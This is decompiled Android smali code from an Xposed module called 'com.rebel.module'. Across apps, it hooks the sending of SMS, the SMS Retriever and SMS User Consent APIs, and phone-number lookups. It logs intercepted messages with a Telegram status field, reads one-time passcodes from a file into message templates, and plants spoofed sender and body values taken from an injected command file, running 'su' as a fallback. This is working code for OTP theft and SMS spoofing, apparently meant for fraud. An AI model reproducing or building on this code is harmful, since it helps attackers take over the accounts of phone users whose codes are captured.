    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ": "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    .line 2441
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 2440
    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 2443
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_22
    return-void
.end method

.method private hookGmsSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 3
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 358
    :try_start_0
    const-string v0, "android.content.Intent"

    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v0, v1}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "getStringExtra"

    new-instance v2, Lcom/rebel/module/XposedHook$2;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$2;-><init>(Lcom/rebel/module/XposedHook;)V

    invoke-static {v0, v1, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 413
    goto :goto_0

    .line 410
    :catchall_0
    move-exception v0

    .line 414
    :goto_0
    return-void
.end method

.method private hookPhoneNumberMethods(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 3
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 678
    :try_start_0
    const-string v0, "android.telephony.TelephonyManager"

    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 679
    invoke-static {v0, v1}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "getLine1Number"

    new-instance v2, Lcom/rebel/module/XposedHook$9;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$9;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 678
    invoke-static {v0, v1, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 698
    :try_start_1
    const-string v0, "android.telephony.SubscriptionInfo"

    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 699
    invoke-static {v0, v1}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "getNumber"

    new-instance v2, Lcom/rebel/module/XposedHook$10;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$10;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 698
    invoke-static {v0, v1, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 721
    goto :goto_0

    .line 718
    :catchall_0
    move-exception v0

    .line 727
    :goto_0
    goto :goto_1

    .line 724
    :catchall_1
    move-exception v0

    .line 728
    :goto_1
    return-void
.end method

.method private hookSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 3
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 871
    :try_start_0
    iget-object v0, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v1, Lde/robv/android/xposed/XposedHelpers;

    const-class v2, Lcom/rebel/module/NativeMethodHook;

    invoke-static {v0, v1, v2}, Lcom/rebel/module/NativeBridge;->nativeHookSmsRetrieval(Ljava/lang/ClassLoader;Ljava/lang/Class;Ljava/lang/Class;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 875
    goto :goto_0

    .line 873
    :catchall_0
    move-exception v0

    .line 876
    :goto_0
    return-void
.end method

.method private hookSmsSending(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 9
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 123
    :try_start_0
    const-string v0, "android.telephony.SmsManager"

    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v2, "sendTextMessage"

    const-class v3, Ljava/lang/String;

    const-class v4, Ljava/lang/String;

    const-class v5, Ljava/lang/String;

    const-class v6, Landroid/app/PendingIntent;

    const-class v7, Landroid/app/PendingIntent;

    new-instance v8, Lcom/rebel/module/XposedHook$1;

    invoke-direct {v8, p0}, Lcom/rebel/module/XposedHook$1;-><init>(Lcom/rebel/module/XposedHook;)V

    filled-new-array/range {v3 .. v8}, [Ljava/lang/Object;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 136
    goto :goto_0

    .line 133
    :catchall_0
    move-exception v0

    .line 137
    :goto_0
    return-void
.end method

.method private hookSmsUserConsentApi(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 5
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 431
    const-string v0, "android.os.Bundle"

    const-string v1, "android.content.Intent"

    :try_start_0
    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 432
    invoke-static {v1, v2}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v2

    const-string v3, "getParcelableExtra"

    new-instance v4, Lcom/rebel/module/XposedHook$3;

    invoke-direct {v4, p0}, Lcom/rebel/module/XposedHook$3;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 431
    invoke-static {v2, v3, v4}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 469
    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 470
    invoke-static {v1, v2}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v1

    const-string v2, "getStringExtra"

    new-instance v3, Lcom/rebel/module/XposedHook$4;

    invoke-direct {v3, p0}, Lcom/rebel/module/XposedHook$4;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 469
    invoke-static {v1, v2, v3}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 503
    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 504
    invoke-static {v0, v1}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v1

    const-string v2, "getString"

    new-instance v3, Lcom/rebel/module/XposedHook$5;

    invoke-direct {v3, p0}, Lcom/rebel/module/XposedHook$5;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 503
    invoke-static {v1, v2, v3}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 534
    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 535
    invoke-static {v0, v1}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "getParcelable"

    new-instance v2, Lcom/rebel/module/XposedHook$6;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$6;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 534
    invoke-static {v0, v1, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 566
    goto :goto_0

    .line 563
    :catchall_0
    move-exception v0

    .line 567
    :goto_0
    return-void
.end method

.method private isNumberAllowed(Ljava/lang/String;)Z
    .locals 4
    .param p1, "destNumber"    # Ljava/lang/String;

    .line 89
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getCachedConfig()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 90
    .local v0, "config":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v2, ""

    if-eqz v1, :cond_0

    :try_start_1
    iget-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist:Ljava/lang/String;

    goto :goto_0

    :cond_0
    move-object v1, v2

    .line 91
    .local v1, "whitelist":Ljava/lang/String;
    :goto_0
    iget-object v3, v0, Lcom/rebel/module/ConfigManager$ConfigData;->blacklist:Ljava/lang/String;

    if-eqz v3, :cond_1

    iget-object v2, v0, Lcom/rebel/module/ConfigManager$ConfigData;->blacklist:Ljava/lang/String;

    .line 92
    .local v2, "blacklist":Ljava/lang/String;
    :cond_1
    iget-boolean v3, v0, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist_mode:Z

    invoke-static {p1, v1, v2, v3}, Lcom/rebel/module/NativeBridge;->isNumberAllowed(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return v3

    .line 93
    .end local v0    # "config":Lcom/rebel/module/ConfigManager$ConfigData;
    .end local v1    # "whitelist":Ljava/lang/String;
    .end local v2    # "blacklist":Ljava/lang/String;
    :catch_0
    move-exception v0

    .line 94
    .local v0, "e":Ljava/lang/Exception;
    const/4 v1, 0x1

    return v1
.end method

.method private isSpoofActive()Z
    .locals 6

    .line 734
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    sget-object v0, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    if-eqz v0, :cond_0

    .line 735
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/rebel/module/XposedHook;->spoofTimestamp:J

    sub-long/2addr v2, v4

    const-wide/32 v4, 0x1d4c0

    cmp-long v0, v2, v4

    if-gez v0, :cond_0

    .line 736
    return v1

    .line 739
    :cond_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_1

    .line 740
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->c0xb8e4c6a9()Ljava/lang/String;

    move-result-object v0

    .line 741
    .local v0, "configBody":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    .line 742
    return v1

    .line 745
    .end local v0    # "configBody":Ljava/lang/String;
    :cond_1
    const/4 v0, 0x0

    return v0
.end method

.method private loadNativeSession()V
    .locals 8

    .line 2590
    :try_start_0
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    move-result v0

    if-nez v0, :cond_0

    .line 2593
    return-void

    .line 2597
    :cond_0
    new-instance v0, Ljava/io/File;

    const-string v1, "/data/data/com.rebel.module/files/session.json"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 2598
    .local v0, "sessionFile":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_5

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v1

    const-wide/16 v3, 0x0

    cmp-long v1, v1, v3

    if-nez v1, :cond_1

    goto :goto_1

    .line 2603
    :cond_1
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/FileReader;

    invoke-direct {v2, v0}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 2604
    .local v1, "reader":Ljava/io/BufferedReader;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 2606
    .local v2, "sb":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    move-object v4, v3

    .local v4, "line":Ljava/lang/String;
    if-eqz v3, :cond_2

    .line 2607
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 2609
    :cond_2
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V

    .line 2610
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    .line 2611
    .local v3, "encoded":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_3

    .line 2612
    return-void

    .line 2615
    :cond_3
    new-instance v5, Ljava/lang/String;

    const/4 v6, 0x2

    invoke-static {v3, v6}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v6

    const-string v7, "UTF-8"

    invoke-direct {v5, v6, v7}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 2616
    .local v5, "json":Ljava/lang/String;
    const-string v6, "{"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_4

    .line 2617
    return-void

    .line 2620
    :cond_4
    invoke-static {v5}, Lcom/rebel/module/NativeBridge;->storePayload(Ljava/lang/String;)Z

    move-result v6
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 2621
    .local v6, "ok":Z
    nop

    .line 2631
    .end local v0    # "sessionFile":Ljava/io/File;
    .end local v1    # "reader":Ljava/io/BufferedReader;
    .end local v2    # "sb":Ljava/lang/StringBuilder;
    .end local v3    # "encoded":Ljava/lang/String;
    .end local v4    # "line":Ljava/lang/String;
    .end local v5    # "json":Ljava/lang/String;
    .end local v6    # "ok":Z
    goto :goto_2

    .line 2601
    .restart local v0    # "sessionFile":Ljava/io/File;
    :cond_5
    :goto_1
    return-void

    .line 2628
    .end local v0    # "sessionFile":Ljava/io/File;
    :catchall_0
    move-exception v0

    .line 2632
    :goto_2
    return-void
.end method

.method private logBlockedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "destNumber"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;
    .param p3, "sourceApp"    # Ljava/lang/String;

    .line 331
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    if-eqz v0, :cond_0

    .line 332
    new-instance v0, Lcom/rebel/module/SmsLogEntry;

    invoke-direct {v0, p1, p2, p3}, Lcom/rebel/module/SmsLogEntry;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 333
    .local v0, "entry":Lcom/rebel/module/SmsLogEntry;
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/rebel/module/SmsLogEntry;->setBlocked(Z)V

    .line 334
    const-string v1, "BLOCKED"

    invoke-virtual {v0, v1}, Lcom/rebel/module/SmsLogEntry;->setTelegramStatus(Ljava/lang/String;)V

    .line 335
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    invoke-virtual {v1, v0}, Lcom/rebel/module/SmsLogDatabase;->insertLog(Lcom/rebel/module/SmsLogEntry;)J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 340
    .end local v0    # "entry":Lcom/rebel/module/SmsLogEntry;
    :cond_0
    goto :goto_0

    .line 337
    :catch_0
    move-exception v0

    .line 341
    :goto_0
    return-void
.end method

.method private logInterceptedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)J
    .locals 3
    .param p1, "destNumber"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;
    .param p3, "sourceApp"    # Ljava/lang/String;

    .line 318
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    if-eqz v0, :cond_0

    .line 319
    new-instance v0, Lcom/rebel/module/SmsLogEntry;

    invoke-direct {v0, p1, p2, p3}, Lcom/rebel/module/SmsLogEntry;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 320
    .local v0, "entry":Lcom/rebel/module/SmsLogEntry;
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    invoke-virtual {v1, v0}, Lcom/rebel/module/SmsLogDatabase;->insertLog(Lcom/rebel/module/SmsLogEntry;)J

    move-result-wide v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-wide v1

    .line 325
    .end local v0    # "entry":Lcom/rebel/module/SmsLogEntry;
    :cond_0
    goto :goto_0

    .line 322
    :catch_0
    move-exception v0

    .line 326
    :goto_0
    const-wide/16 v0, -0x1

    return-wide v0
.end method

.method private processInjectCommand()V
    .locals 13

    .line 1184
    const-string v0, ""

    const-string v1, "{}"

    :try_start_0
    new-instance v2, Ljava/io/File;

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getInjectCmdFile()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1185
    .local v2, "cmdFile":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_6

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x3

    cmp-long v3, v3, v5

    if-gez v3, :cond_0

    goto/16 :goto_5

    .line 1189
    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 1190
    .local v3, "sb":Ljava/lang/StringBuilder;
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/FileReader;

    invoke-direct {v5, v2}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 1192
    .local v4, "reader":Ljava/io/BufferedReader;
    :goto_0
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v5

    move-object v6, v5

    .local v6, "line":Ljava/lang/String;
    if-eqz v5, :cond_1

    .line 1193
    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 1195
    :cond_1
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V

    .line 1197
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    .line 1198
    .local v5, "content":Ljava/lang/String;
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    goto :goto_4

    .line 1204
    :cond_2
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7, v5}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 1205
    .local v7, "cmd":Lorg/json/JSONObject;
    const-string v8, "sender"

    invoke-virtual {v7, v8, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 1206
    .local v8, "sender":Ljava/lang/String;
    const-string v9, "message"

    invoke-virtual {v7, v9, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 1208
    .local v0, "message":Ljava/lang/String;
    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_4

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v9
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-eqz v9, :cond_3

    goto :goto_3

    .line 1216
    :cond_3
    :try_start_1
    new-instance v9, Ljava/io/FileWriter;

    invoke-direct {v9, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 1217
    .local v9, "fw":Ljava/io/FileWriter;
    invoke-virtual {v9, v1}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    .line 1218
    invoke-virtual {v9}, Ljava/io/FileWriter;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 1222
    .end local v9    # "fw":Ljava/io/FileWriter;
    goto :goto_1

    .line 1219
    :catch_0
    move-exception v1

    .line 1221
    .local v1, "e":Ljava/lang/Exception;
    :try_start_2
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v9

    const/4 v10, 0x3

    new-array v10, v10, [Ljava/lang/String;

    const-string v11, "su"

    const/4 v12, 0x0

    aput-object v11, v10, v12

    const-string v11, "-c"

    const/4 v12, 0x1

    aput-object v11, v10, v12

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "echo \'{}\' > "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getInjectCmdFile()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    const/4 v12, 0x2

    aput-object v11, v10, v12

    invoke-virtual {v9, v10}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Process;->waitFor()I

    .line 1229
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_1
    sput-object v8, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    .line 1230
    sput-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    .line 1231
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    sput-wide v9, Lcom/rebel/module/XposedHook;->spoofTimestamp:J
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 1234
    :try_start_3
    invoke-static {v8, v0}, Lcom/rebel/module/NativeBridge;->nativeSetSpoof(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 1236
    goto :goto_2

    .line 1235
    :catchall_0
    move-exception v1

    .line 1244
    .end local v0    # "message":Ljava/lang/String;
    .end local v2    # "cmdFile":Ljava/io/File;
    .end local v3    # "sb":Ljava/lang/StringBuilder;
    .end local v4    # "reader":Ljava/io/BufferedReader;
    .end local v5    # "content":Ljava/lang/String;
    .end local v6    # "line":Ljava/lang/String;
    .end local v7    # "cmd":Lorg/json/JSONObject;
    .end local v8    # "sender":Ljava/lang/String;
    :goto_2
    goto :goto_6

    .line 1211
    .restart local v0    # "message":Ljava/lang/String;
    .restart local v2    # "cmdFile":Ljava/io/File;
    .restart local v3    # "sb":Ljava/lang/StringBuilder;
    .restart local v4    # "reader":Ljava/io/BufferedReader;
    .restart local v5    # "content":Ljava/lang/String;
    .restart local v6    # "line":Ljava/lang/String;
    .restart local v7    # "cmd":Lorg/json/JSONObject;
    .restart local v8    # "sender":Ljava/lang/String;
    :cond_4
    :goto_3
    return-void

    .line 1199
    .end local v0    # "message":Ljava/lang/String;
    .end local v7    # "cmd":Lorg/json/JSONObject;
    .end local v8    # "sender":Ljava/lang/String;
    :cond_5
    :goto_4
    return-void

    .line 1186
    .end local v3    # "sb":Ljava/lang/StringBuilder;
    .end local v4    # "reader":Ljava/io/BufferedReader;
    .end local v5    # "content":Ljava/lang/String;
    .end local v6    # "line":Ljava/lang/String;
    :cond_6
    :goto_5
    return-void

    .line 1241
    .end local v2    # "cmdFile":Ljava/io/File;
    :catch_1
    move-exception v0

    .line 1245
    :goto_6
    return-void
.end method

.method private readOtpFromFile()Ljava/lang/String;
    .locals 6

    .line 822
    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getLastOtpFile()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 823
    .local v1, "f":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-nez v2, :cond_0

    goto :goto_0

    .line 825
    :cond_0
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/FileReader;

    invoke-direct {v3, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 826
    .local v2, "reader":Ljava/io/BufferedReader;
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    .line 827
    .local v3, "otp":Ljava/lang/String;
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V

    .line 828
    if-eqz v3, :cond_1

    .line 829
    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    move-object v3, v4

    .line 830
    :cond_1
    if-eqz v3, :cond_2

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v4, :cond_2

    move-object v0, v3

    :cond_2
    return-object v0

    .line 824
    .end local v2    # "reader":Ljava/io/BufferedReader;
    .end local v3    # "otp":Ljava/lang/String;
    :cond_3
    :goto_0
    return-object v0

    .line 831
    .end local v1    # "f":Ljava/io/File;
    :catch_0
    move-exception v1

    .line 832
    .local v1, "e":Ljava/lang/Exception;
    return-object v0
.end method

.method private resolveOtpPlaceholder(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "template"    # Ljava/lang/String;
    .param p2, "originalBody"    # Ljava/lang/String;

    .line 775
    if-eqz p1, :cond_3

    const-string v0, "{otp}"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_1

